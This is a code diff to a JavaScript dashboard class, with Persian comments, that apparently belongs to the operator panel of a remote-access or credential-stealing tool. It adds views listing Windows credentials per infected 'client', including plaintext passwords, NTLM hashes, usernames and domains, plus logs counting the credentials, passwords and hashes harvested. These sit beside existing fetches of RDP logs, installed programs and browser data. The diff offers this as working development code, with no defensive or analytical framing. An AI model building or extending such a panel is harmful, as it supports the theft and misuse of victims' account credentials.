@@ -86,8 +86,9 @@ class DashboardManager {
         this.fetchRDPLogs(),
         this.fetchInstalledPrograms(),
         this.fetchUploadedFiles(),
-        // NEW: اضافه کردن fetch جدید
         this.fetchComprehensiveBrowserData(),
+        this.fetchWindowsCredentials(), // جدید
+        this.fetchCredentialStatus(), // جدید
       ]);
     } catch (error) {
       console.error("Error fetching data:", error);
@@ -171,6 +172,152 @@ class DashboardManager {
       console.error("Fetch error:", error);
       throw error;
     }
+  }
+
+  async fetchWindowsCredentials() {
+    try {
+      const data = await this.fetchWithAuth("?get_windows_credentials");
+
+      if (data.error) {
+        console.error("Error:", data.error);
+        return;
+      }
+
+      this.renderWindowsCredentials(
+        "windows-credentials",
+        data.windows_credentials
+      );
+    } catch (error) {
+      if (error.message === "Authentication required") return;
+      console.error("Error fetching windows credentials:", error);
+      this.showError("Failed to fetch windows credentials");
+    }
+  }
+
+  async fetchCredentialStatus() {
+    try {
+      const data = await this.fetchWithAuth("?get_credential_status");
+
+      if (data.error) {
+        console.error("Error:", data.error);
+        return;
+      }
+
+      this.renderCredentialStatus("credential-status", data.credential_status);
+    } catch (error) {
+      if (error.message === "Authentication required") return;
+      console.error("Error fetching credential status:", error);
+      this.showError("Failed to fetch credential status");
+    }
+  }
+
+  renderWindowsCredentials(containerId, data) {
+    const container = document.getElementById(containerId);
+    if (!container) return;
+
+    if (data.length === 0) {
+      container.innerHTML = this.getEmptyState("No windows credentials found");
+      return;
+    }
+
+    container.innerHTML = data
+      .map((item) => this.createCredentialEntry(item))
+      .join("");
+  }
+
+  renderCredentialStatus(containerId, data) {
+    const container = document.getElementById(containerId);
+    if (!container) return;
+
+    if (data.length === 0) {
+      container.innerHTML = this.getEmptyState("No credential status logs");
+      return;
+    }
+
+    container.innerHTML = data
+      .map((item) => this.createCredentialStatusEntry(item))
+      .join("");
+  }
+
+  createCredentialEntry(credential) {
+    const statusClass = credential.password
+      ? "status-completed"
+      : "status-pending";
+    const statusText = credential.password ? "Password" : "Hash Only";
+
+    return `
+        <div class="entry-item" data-type="credential" data-info='${JSON.stringify(
+          credential
+        ).replace(
+          /'/g,
+          "&#39;"
+        )}' onclick="dashboard.openCredentialModal(this)">
+            <div class="entry-header">
+                <span class="entry-time">${new Date(
+                  credential.created_at
+                ).toLocaleString()}</span>
+                <span class="entry-status ${statusClass}">${statusText}</span>
+            </div>
+            <div class="entry-content">
+                <p><strong>Client:</strong> ${credential.client_id}</p>
+                <p><strong>User:</strong> ${credential.username || "N/A"}</p>
+                <p><strong>Domain:</strong> ${credential.domain || "N/A"}</p>
+                <p><strong>Type:</strong> ${credential.credential_type}</p>
+                ${
+                  credential.password
+                    ? `<p><strong>Password:</strong> ${this.escapeHtml(
+                        credential.password
+                      )}</p>`
+                    : ""
+                }
+                ${
+                  credential.ntlm_hash
+                    ? `<p><strong>NTLM:</strong> ${credential.ntlm_hash}</p>`
+                    : ""
+                }
+            </div>
+        </div>
+    `;
+  }
+
+  createCredentialStatusEntry(status) {
+    const statusClass =
+      status.status === "success"
+        ? "status-completed"
+        : status.status === "error"
+        ? "status-failed"
+        : "status-pending";
+
+    return `
+        <div class="entry-item">
+            <div class="entry-header">
+                <span class="entry-time">${new Date(
+                  status.created_at
+                ).toLocaleString()}</span>
+                <span class="entry-status ${statusClass}">${
+      status.status
+    }</span>
+            </div>
+            <div class="entry-content">
+                <p><strong>Client:</strong> ${status.client_id}</p>
+                <p><strong>Credentials Found:</strong> ${
+                  status.credentials_found
+                }</p>
+                <p><strong>Passwords:</strong> ${status.passwords_found}</p>
+                <p><strong>Hashes:</strong> ${status.hashes_found}</p>
+                <p><strong>Message:</strong> ${this.escapeHtml(
+                  status.message
+                )}</p>
+            </div>
+        </div>
+    `;
+  }
+
+  openCredentialModal(element) {
+    const credential = JSON.parse(element.getAttribute("data-info"));
+
+    // ایجاد مودال مخصوص credential (می‌توانید از مودال‌های موجود استفاده کنید)
+    this.openDataModal(element); // استفاده از مودال موجود به صورت موقت
   }
 
   safeJsonParse(str) {
